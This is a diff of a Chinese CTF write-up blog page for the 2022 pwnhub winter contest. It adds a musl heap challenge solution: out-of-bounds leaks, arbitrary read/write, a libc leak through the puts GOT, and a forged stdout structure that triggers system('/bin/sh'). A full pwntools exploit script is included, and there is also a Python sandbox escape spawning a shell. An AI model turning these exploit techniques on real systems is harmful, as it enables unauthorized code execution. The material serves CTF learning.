@@ -25,9 +25,11 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://nqoinaen.github.io/img/img14.jpg">
 <meta property="article:published_time" content="2022-12-23T04:27:53.000Z">
-<meta property="article:modified_time" content="2022-12-23T11:17:20.953Z">
+<meta property="article:modified_time" content="2022-12-24T07:11:56.014Z">
 <meta property="article:author" content="nqoinaen">
 <meta property="article:tag" content="整数溢出">
+<meta property="article:tag" content="musl">
+<meta property="article:tag" content="数组越界">
 <meta property="article:tag" content="pyjail">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://nqoinaen.github.io/img/img14.jpg">
@@ -251,7 +253,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.9k 字
+          4.8k 字
         
       </span>
     
@@ -262,7 +264,7 @@
         
         
         
-          4 分钟
+          10 分钟
         
       </span>
     
@@ -313,7 +315,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2022年12月23日 晚上
+                    本文最后更新于：2022年12月24日 下午
                   
                 
               </p>
@@ -333,8 +335,34 @@
 <p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;47.97.127.1&#x27;</span>,<span class="hljs-number">27768</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims 			:r.recvuntil(delims)<br><span class="hljs-comment">#---------------------------3</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;HP: &quot;</span>)<br>    num=rc(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;15 &quot;</span>:<br>        sl(<span class="hljs-string">&quot;1&quot;</span>)<br>        ru(<span class="hljs-string">&quot;GOLD:  &quot;</span>)<br>        num=rc(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;200&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        sl(<span class="hljs-string">&quot;2&quot;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;28633116&#x27;</span>)<br><span class="hljs-comment">#---------------------------999</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;LV: &quot;</span>)<br>    num=rc(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;999&quot;</span>:<br>        sl(<span class="hljs-string">&quot;1&quot;</span>)<br>        r.interactive()<br>    <span class="hljs-keyword">else</span>:<br>        sl(<span class="hljs-string">&quot;2&quot;</span>)<br></code></pre></td></tr></table></figure>
 <p>233我纯打游戏写了个脚本，本地行，远端有时间限制，打最后999级的怪最多到round6就给我断了</p>
+<h2 id="heap">heap</h2>
+<p>musl pwn 没接触过，这题就当入门，我分析的很烂，看着乐呵一下就行</p>
+<h3 id="漏洞">漏洞</h3>
+<p>这题全是破绽，可以数组越界，可以堆溢出，free后指针悬挂(不过我还是不太了解在musl中怎么利用)</p>
+<h3 id="利用">利用</h3>
+<p>参考的是<a target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/group/824215518412">nu1l战队在知识星球分享的wp</a>，大致是数组越界达成任意地址读写，用IO打puts来getshell</p>
+<h4 id="1-leak-heap-addr">1.leak heap_addr</h4>
+<p>数组越界show(16)泄露堆地址</p>
+<p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<h4 id="2-leak-pie">2.leak pie</h4>
+<p>填充字符串‘a’，继续配合show(16)泄露pie的偏移</p>
+<p>然后复原一下‘a’覆盖的地址</p>
+<p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<h4 id="3-任意地址读写">3.任意地址读写</h4>
+<p>下标0x390处有个指针指向ptr自己，这样我们就控制了ptr，可以任意地址读写</p>
+<p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
+<h4 id="4-泄漏libc">4.泄漏libc</h4>
+<p>改ptr指针指向puts的got表，泄漏libc，得到stdout地址</p>
+<h4 id="5-打IO">5.打IO</h4>
+<p>因为musl编译的好像没有malloc_hook,free_hook之类的，就要打IO来getshell</p>
+<p>改ptr指针指向stdout，伪造fakeIO，遇到puts触发getshell</p>
+<p>可以看到最后执行到如图所示</p>
+<p>要执行到这个分支还是要满足一些条件，具体fake_IO要满足哪些条件还是得看源码</p>
+<p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/8.png" srcset="/img/loading.gif" lazyload alt="8"></p>
+<h3 id="exp">exp</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;47.97.127.1&#x27;</span>, <span class="hljs-number">23030</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims 			:r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(r,cmd)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#-------leak_heap-----------</span><br>show(<span class="hljs-number">16</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0x180</span><br>info(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><span class="hljs-comment">#--------leak_pie--------</span><br>edit(<span class="hljs-number">16</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">16</span>)<br>ru(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>pie_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0x40c0</span><br>info(<span class="hljs-string">&quot;pie_base&quot;</span>,pie_base)<br><span class="hljs-comment">#-------------------------</span><br>meta_arena = p64(heap_base + <span class="hljs-number">0x180</span>) + p64(heap_base + <span class="hljs-number">0xb8</span>)<br>edit(<span class="hljs-number">16</span>,<span class="hljs-number">0x10</span>,meta_arena)<br>bss_ptr = pie_base + <span class="hljs-number">0x4040</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,p64(bss_ptr))<br>edit(<span class="hljs-number">0x390</span>,<span class="hljs-number">0x10</span>,p64(bss_ptr)+p64(pie_base+elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br><span class="hljs-comment">#---------leak_libc-------</span><br>show(<span class="hljs-number">1</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br>stdout=libc_base+<span class="hljs-number">0x98320</span><br>edit(<span class="hljs-number">0x390</span>,<span class="hljs-number">0x10</span>,p64(bss_ptr)+p64(stdout))<br><span class="hljs-comment">#-------------------------</span><br>fake_IO = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> <span class="hljs-comment"># flags</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rpos</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rend</span><br>fake_IO += p64(libc_base + <span class="hljs-number">0x4bf0f</span>) <span class="hljs-comment"># close</span><br>fake_IO += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># wend</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># wpos</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># mustbezero_1</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># wbase</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># read</span><br>fake_IO += p64(system) <span class="hljs-comment"># write</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#b*__fwritex+42</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(fake_IO),fake_IO)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure>
 <h2 id="坐井观天">坐井观天</h2>
-<p>python沙箱逃逸(pyjail)，这类题没做过，就当开个头</p>
+<p>python沙箱逃逸(pyjail)，这类题没做过</p>
 <blockquote>
 <p>python沙箱逃逸（pyjail），是CTF中一类题的通称：在这些题目中，我们能够交互式地用<code>eval</code>或者<code>exec</code>执行python代码。然而，执行的代码和上下文均受到一定限制，如题目用正则表达式拒绝部分字符的输入、以及令<code>__builtins__=None</code>等</p>
 </blockquote>
@@ -342,11 +370,6 @@
 <p><code>eval(input())</code>执行我们接下来输入的命令</p>
 <p>接着输入<code>__import__('os').system('sh')</code>来获得shell即可</p>
 <p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
-<h2 id="参考">参考</h2>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1sG4y1g79x/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&amp;vd_source=96ebee06b9651070ae4a3d85c71959cb">Pwnhub冬季赛2022[Pwn]justJS哔哩哔哩bilibili</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247485887&amp;idx=1&amp;sn=b1b705a731daf84b1812b6aac9cf1528&amp;chksm=cf53c909f824401f10ad83066fc78ff57b011958f9c0e33ef010a86f3f834ce51fb2e2186dd4&amp;mpshare=1&amp;scene=23&amp;srcid=12236ytzyKm8QMQtseI6aSIX&amp;sharer_sharetime=1671772428743&amp;sharer_shareid=600395608e88237687e56b1c66678009#rd">2022 pwnhub冬季赛 writeup by Arr3stY0u (qq.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1sv4y1Q7hW/?spm_id_from=333.999.0.0&amp;vd_source=96ebee06b9651070ae4a3d85c71959cb">Pwnhub冬季赛2022[Misc] 坐井观天哔哩哔哩_bilibili</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578966149">[PyJail] python沙箱逃逸探究·总览（HNCTF题解） - 知乎 (zhihu.com)</a></p>
 
                 
               </div>
@@ -382,6 +405,10 @@
       
         <a href="/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">#整数溢出</a>
       
+        <a href="/tags/musl/">#musl</a>
+      
+        <a href="/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/">#数组越界</a>
+      
         <a href="/tags/pyjail/">#pyjail</a>
       
     </div>
@@ -413,7 +440,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2022年12月23日</div>
+          <div>2022年12月24日</div>
         </div>
       
       
